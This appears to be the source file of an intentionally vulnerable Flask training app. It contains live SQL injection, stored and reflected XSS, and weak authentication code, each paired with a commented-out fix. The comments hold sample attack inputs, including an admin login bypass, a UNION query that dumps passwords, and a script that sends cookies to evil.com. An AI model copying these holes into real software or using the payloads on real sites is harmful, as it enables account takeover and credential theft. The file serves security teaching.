"""
VULNERABLE TRAINING APPLICATION - DO NOT DEPLOY PUBLICLY
===========================================================
This app intentionally contains:
  1. SQL Injection (login form + search endpoint)
  2. Stored & Reflected XSS (search results, comment feature)
  3. Broken Authentication (plaintext passwords, weak session mgmt,
     no rate limiting, predictable session identifiers)

Each vulnerable block is marked with:  # [VULN-N]
Each corresponding fix is marked with: # [FIX-N]  (commented out, for reference)
"""

import sqlite3
import os
from flask import Flask, request, render_template, redirect, session, g, make_response

app = Flask(__name__)

# [VULN-3a] Broken Authentication: hardcoded, weak secret key.
# Flask uses this to sign session cookies. A weak/static/leaked key lets
# an attacker forge valid session cookies for ANY user, including admin.
app.secret_key = "supersecret123"  # noqa: S105 -- intentionally bad
# [FIX-3a] app.secret_key = os.environ["FLASK_SECRET_KEY"]  # load a
#          cryptographically random 32+ byte value from a secrets manager
#          or env var injected at deploy time; rotate periodically.

DB_DIR = os.environ.get("VULNLAB_DB_DIR", os.path.dirname(__file__))
os.makedirs(DB_DIR, exist_ok=True)
DB_PATH = os.path.join(DB_DIR, "vuln.db")


def get_db():
    if "db" not in g:
        g.db = sqlite3.connect(DB_PATH)
        g.db.row_factory = sqlite3.Row
    return g.db


@app.teardown_appcontext
def close_db(exception=None):
    db = g.pop("db", None)
    if db is not None:
        db.close()


def init_db():
    """Seed the DB with a users table (plaintext passwords) and comments table."""
    db = sqlite3.connect(DB_PATH)
    db.executescript(
        """
        DROP TABLE IF EXISTS users;
        DROP TABLE IF EXISTS comments;

        CREATE TABLE users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL,   -- [VULN-3b] plaintext, see note below
            is_admin INTEGER NOT NULL DEFAULT 0
        );

        CREATE TABLE comments (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            body TEXT NOT NULL
        );
        """
    )
    db.executemany(
        "INSERT INTO users (username, password, is_admin) VALUES (?, ?, ?)",
        [
            ("admin", "admin123", 1),
            ("alice", "alicepassword", 0),
            ("bob", "hunter2", 0),
        ],
    )
    db.commit()
    db.close()


# [VULN-3b] Broken Authentication: passwords stored in plaintext.
# Anyone with DB read access (SQLi, backup leak, insider) gets every
# credential immediately, and users who reuse passwords elsewhere are
# now compromised on other sites too.
# [FIX-3b] Hash with a slow, salted KDF at signup:
#   from werkzeug.security import generate_password_hash, check_password_hash
#   stored = generate_password_hash(password)          # at registration
#   check_password_hash(stored, submitted_password)     # at login
#   Never store or log the raw password at all, even transiently.


@app.route("/", methods=["GET"])
def index():
    return render_template("index.html", user=session.get("username"))


@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")

        # [VULN-1] SQL Injection: user input concatenated directly into
        # the query string. An attacker can submit:
        #   username = admin' --
        #   password = anything
        # producing:
        #   SELECT * FROM users WHERE username='admin' --' AND password='anything'
        # The "--" comments out the password check, logging in as admin
        # with no valid credentials. Also enables UNION-based data
        # exfiltration (e.g. username = "' UNION SELECT 1,'x','x',1--").
        query = (
            "SELECT * FROM users WHERE username='"
            + username
            + "' AND password='"
            + password
            + "'"
        )
        db = get_db()
        cur = db.execute(query)  # [VULN-1] raw string executed as SQL
        user = cur.fetchone()

        # [FIX-1] Use parameterized queries — the driver treats input as
        # data, never as SQL syntax, regardless of what characters it
        # contains:
        #   cur = db.execute(
        #       "SELECT * FROM users WHERE username = ? AND password = ?",
        #       (username, password),
        #   )
        #   (combine with [FIX-3b] hashed passwords: fetch by username
        #   only, then check_password_hash against the stored hash.)

        # [VULN-3c] Broken Authentication: no rate limiting / lockout.
        # This endpoint can be brute-forced or credential-stuffed without
        # limit — no delay, no CAPTCHA, no account lockout, no logging
        # of failed attempts.
        # [FIX-3c] Add a rate limiter (e.g. Flask-Limiter) keyed on
        #   IP + username, exponential backoff after N failures, and
        #   alerting/logging on repeated failures.

        if user:
            session["username"] = user["username"]
            session["is_admin"] = bool(user["is_admin"])
            # [VULN-3d] Broken Authentication: session fixation / no
            # regeneration. Flask's default session is a signed cookie,
            # but we never rotate the session ID/nonce on privilege
            # change (login), so a session token issued pre-login could
            # be reused post-login if an attacker fixed it on the victim.
            # [FIX-3d] Regenerate the session (clear then repopulate, or
            #   use a session interface that issues a new server-side ID)
            #   immediately after successful authentication.
            return redirect("/dashboard")
        error = "Invalid credentials"
    return render_template("login.html", error=error)


@app.route("/dashboard")
def dashboard():
    if "username" not in session:
        return redirect("/login")
    db = get_db()
    comments = db.execute("SELECT username, body FROM comments").fetchall()
    return render_template(
        "dashboard.html",
        user=session["username"],
        is_admin=session.get("is_admin", False),
        comments=comments,
    )


@app.route("/comment", methods=["POST"])
def comment():
    if "username" not in session:
        return redirect("/login")
    body = request.form.get("body", "")
    db = get_db()
    # This insert IS parameterized (not every endpoint needs to be SQLi
    # vulnerable for the XSS lesson to work) — the vulnerability here is
    # purely in how `body` is rendered later. See templates/dashboard.html.
    db.execute(
        "INSERT INTO comments (username, body) VALUES (?, ?)",
        (session["username"], body),
    )
    db.commit()
    # [VULN-2a] Stored XSS: `body` is stored completely unsanitized. If it
    # contains "<script>fetch('//evil.com/steal?c='+document.cookie)</script>",
    # that payload is now permanently in the DB and will execute in the
    # browser of every user who views the dashboard (see [VULN-2b]).
    # [FIX-2a] Sanitize/validate on input where feasible (e.g. strip HTML
    #   entirely with a library like `bleach` if plain text is expected),
    #   AND always defend at output time too — never trust that input-side
    #   sanitization alone is sufficient (defense in depth).
    return redirect("/dashboard")


@app.route("/search")
def search():
    q = request.args.get("q", "")
    db = get_db()

    # [VULN-1b] SQL Injection via GET parameter, LIKE clause.
    # e.g. ?q=x' UNION SELECT username,password,1,1 FROM users--
    # leaks every username/password directly into the results list.
    query = "SELECT username, body FROM comments WHERE body LIKE '%" + q + "%'"
    results = db.execute(query).fetchall()
    # [FIX-1b] cur = db.execute(
    #     "SELECT username, body FROM comments WHERE body LIKE ?",
    #     (f"%{q}%",),
    # )

    # [VULN-2b] Reflected XSS: the raw query `q` is echoed back into the
    # page via `| safe` in templates/search.html, so
    #   ?q=<script>alert(document.cookie)</script>
    # executes immediately in the victim's browser — no storage needed,
    # just get them to click a crafted link.
    # [FIX-2b] Never mark user input `| safe` in Jinja2. Let Jinja2's
    #   autoescaping do its job (the default, unless explicitly disabled)
    #   and additionally set a strict Content-Security-Policy header to
    #   limit damage even if an escaping bug slips through:
    #     resp.headers["Content-Security-Policy"] = "default-src 'self'"
    return render_template("search.html", q=q, results=results)


@app.route("/logout")
def logout():
    session.clear()
    return redirect("/")


if __name__ == "__main__":
    if not os.path.exists(DB_PATH):
        init_db()
    # [VULN-3e] Debug mode exposes the Werkzeug interactive debugger,
    # which allows arbitrary Python code execution via the browser if any
    # unhandled exception is triggered. Combined with the SQLi above,
    # this is a straight line to RCE. NEVER enable debug=True outside
    # this isolated lab.
    # [FIX-3e] debug=False in anything resembling production; use a real
    #   WSGI server (gunicorn/uwsgi) behind a reverse proxy instead of
    #   Flask's dev server.
    app.run(host="0.0.0.0", port=5000, debug=True)  # noqa: S104 -- lab only, container-isolated
